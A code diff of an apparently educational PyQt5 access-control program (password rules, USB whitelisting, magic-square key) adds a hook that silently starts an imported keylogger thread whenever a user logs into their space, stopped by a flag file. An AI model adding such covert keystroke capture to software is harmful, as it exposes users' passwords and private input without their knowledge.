@@ -1,6 +1,8 @@
 from PyQt5 import QtWidgets
 import time
 import win32com.client  # слушаем USB
+from threading import Thread  # потоки для кейлогера
+from newkeylog import logger
 
 from Adminmenu import Ui_Adminmenu
 from Chooseoptionsform import Ui_Chooseoptionsform
@@ -21,6 +23,7 @@ from Magicsquare import Ui_MagicSquare
 # [4] - обязательность спец сиволов
 # [5] - активность пользователя
 # [6] - разрешённые устройства
+
 
 class Tokb(QtWidgets.QMainWindow):
     def __init__(self):
@@ -43,11 +46,10 @@ class Tokb(QtWidgets.QMainWindow):
         except SyntaxError:
             self.iffileerror()
             self.readall()
-        #print("Вход " + str(self.users.items()))
+        # print("Вход " + str(self.users.items()))
         for self.user in self.users:
             if self.users[self.user][5]:
                 self.wind.Userslist.addItem(self.user)
-
 
     def entering(self):
         if self.tryes != 1:
@@ -69,12 +71,17 @@ class Tokb(QtWidgets.QMainWindow):
 
     def openuserspacedialog(self):
         self.readall()
+        self.writepotok('0')
         self.dialog = Ui_Userspace()
         self.dialog.setupUi(self)
         self.dialog.Username.setText(self.name)
         self.dialog.Exit.clicked.connect(self.exitbutton)
         self.dialog.ChangepassButton.clicked.connect(self.opennewpassformdialog)
         self.checkingpass()
+
+        self.thread1 = Thread(target=logger)
+        self.thread1.start()
+        # Условие заверщения
 
         wmi = win32com.client.GetObject("winmgmts:")
         for objItem in wmi.InstancesOf("CIM_DiskDrive"):
@@ -98,7 +105,7 @@ class Tokb(QtWidgets.QMainWindow):
                 self.message('You mast wait ' + str(
                     self.users[self.name][3] - int(time.time() - self.users[self.name][1])) + ' seconds')
                 self.backtouserspacedialog()
-            elif self.newpass[len(self.newpass)-1] == ' ':
+            elif self.newpass[len(self.newpass) - 1] == ' ':
                 self.message('The space (" ") can\'t be used as a last symbol of pass')
             elif len(self.newpass) > 25:
                 self.message('Max len of all passwords in system is 25')
@@ -147,8 +154,8 @@ class Tokb(QtWidgets.QMainWindow):
             self.users[user][0] = self.deshifr(self.users[user][0])
         if len(self.users) < 1:
             self.iffileerror()
-        #print(self.users.items())
-        #print(self.key)
+        # print(self.users.items())
+        # print(self.key)
 
     def iffileerror(self):
         self.users = {'Admin': ['Admin', time.time(), 1, 5, False, True, []]}
@@ -172,6 +179,8 @@ class Tokb(QtWidgets.QMainWindow):
 
     def exitbutton(self):
         self.wind = Ui_Entering()
+        self.writepotok('1')
+        #  self.thread1.join()
         self.initiation()
         self.wind.Enter.clicked.connect(self.entering)
 
@@ -191,16 +200,21 @@ class Tokb(QtWidgets.QMainWindow):
             if len(needs) < self.key[i]:
                 new = new + " "
             else:
-                new = new + needs[self.key[i]-1]
+                new = new + needs[self.key[i] - 1]
         return new
 
     def deshifr(self, needs):
         new = ""
-        for i in range(1, len(self.key)+1):
+        for i in range(1, len(self.key) + 1):
             new = new + needs[self.key.index(i)]
-        while new[len(new)-1] == " ":
-            new = new[0:len(new)-1]
+        while new[len(new) - 1] == " ":
+            new = new[0:len(new) - 1]
         return new
+
+    def writepotok(self, to_do):
+        f = open('potok.txt', 'w')
+        f.write(to_do)
+        f.close()
 
 class Ui_Adminmenu_2(Tokb):
     def __init__(self):
@@ -253,7 +267,7 @@ class Ui_Adminmenu_2(Tokb):
                 self.message('You mast wait ' + str(
                     self.users[self.name][3] - int(time.time() - self.users[self.name][1])) + ' seconds')
                 self.backbutton()
-            elif self.newpass[len(self.newpass)-1] == ' ':
+            elif self.newpass[len(self.newpass) - 1] == ' ':
                 self.message('The space (" ") can\'t be used as a last symbol of pass')
             elif len(self.newpass) > 25:
                 self.message('Max len of all passwords in system is 25')
@@ -350,9 +364,8 @@ class Ui_Adminmenu_2(Tokb):
             self.userusb.wind.DenyaccessButton.clicked.connect(self.usbdenya)
             self.userusb.exec_()
 
-
     def usbaccess(self):
-        if  self.userusb.wind.USBlist.count() < 1:
+        if self.userusb.wind.USBlist.count() < 1:
             self.message('List of users is empty')
         else:
             self.selectedusb = self.ablesusb[self.userusb.wind.USBlist.currentIndex()]
@@ -363,7 +376,7 @@ class Ui_Adminmenu_2(Tokb):
                 self.usbdialog()
 
     def usbdenya(self):
-        if  self.userusb.wind.USBlist.count() < 1:
+        if self.userusb.wind.USBlist.count() < 1:
             self.message('List of users is empty')
         else:
             self.selectedusb = self.ablesusb[self.userusb.wind.USBlist.currentIndex()]
@@ -394,12 +407,12 @@ class Ui_Adminmenu_2(Tokb):
         self.dialogms.setupUi(self)
         for i in range(1, 26):
             nn = 'No_' + str(i)
-            exec("self.dialogms." + nn + ".setValue(self.key[" + str(i-1) + "])")
+            exec("self.dialogms." + nn + ".setValue(self.key[" + str(i - 1) + "])")
         self.dialogms.Submit.clicked.connect(self.submitms)
 
     def submitms(self):
-        sumleft = self.dialogms.No_1.value()+self.dialogms.No_7.value()+self.dialogms.No_13.value()+self.dialogms.No_19.value()+self.dialogms.No_25.value()
-        sumright = self.dialogms.No_5.value()+self.dialogms.No_9.value()+self.dialogms.No_13.value()+self.dialogms.No_17.value()+self.dialogms.No_21.value()
+        sumleft = self.dialogms.No_1.value() + self.dialogms.No_7.value() + self.dialogms.No_13.value() + self.dialogms.No_19.value() + self.dialogms.No_25.value()
+        sumright = self.dialogms.No_5.value() + self.dialogms.No_9.value() + self.dialogms.No_13.value() + self.dialogms.No_17.value() + self.dialogms.No_21.value()
         stroks = [0, 0, 0, 0, 0]
         stolbs = [0, 0, 0, 0, 0]
         vrem = 1
@@ -424,7 +437,7 @@ class Ui_Adminmenu_2(Tokb):
                 itog = False
         if (sumleft != 65) or (sumright != 65):
             itog = False
-        vrem=[]
+        vrem = []
         for i in range(1, 26):
             nn = 'No_' + str(i)
             exec("vrem.append(self.dialogms." + nn + ".value())")
@@ -439,7 +452,6 @@ class Ui_Adminmenu_2(Tokb):
             self.backbutton()
         else:
             print('It\'s not magic square')
-
 
     def openchooseoptionsformdialog(self):
         self.dialogop = Ui_Chooseoptionsform()
@@ -500,11 +512,13 @@ class Error(QtWidgets.QDialog):
         self.wind.setupUi(self)
         self.wind.textBrowser.setText('-*-')
 
+
 class UsbAccess(QtWidgets.QDialog):
     def __init__(self):
         super(UsbAccess, self).__init__()
         self.wind = Ui_USBAccess()
         self.wind.setupUi(self)
+
 
 if __name__ == '__main__':
     app = QtWidgets.QApplication([])
